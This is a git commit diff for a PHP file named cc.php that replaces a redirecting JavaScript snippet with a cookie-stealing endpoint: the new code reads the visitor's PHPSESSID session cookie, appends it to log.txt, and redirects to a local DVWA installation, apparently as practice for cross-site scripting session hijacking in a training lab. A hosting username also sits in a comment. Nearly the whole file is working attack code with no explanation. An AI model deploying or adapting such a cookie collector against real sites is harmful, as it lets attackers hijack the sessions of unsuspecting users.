507785f78cb68a998935bdde4c1edcd97db68f46
huynguyen145 <57034439+huynguyen145@users.noreply.github.com>
2021-01-09 16:21:21 +0700

    Add files via upload

--- cc.php
+++ cc.php
@@ -1,4 +1,15 @@
-<script>
-alert("Cannot access to this website");
-document.location= "http://localhost:8888/hack/cc.php"
-</script>
+<?php
+$file = fopen('log.txt', 'a') or exit('Cannot access to this file');
+
+
+$cookieTaken = $_COOKIE['PHPSESSID'];
+
+fwrite($file, 'cookie: ' . $cookieTaken . PHP_EOL);
+
+fclose($file);
+
+header("location: http://localhost:8888/DVWA-master/index.php");
+
+
+//username epiz_27628104
+?>
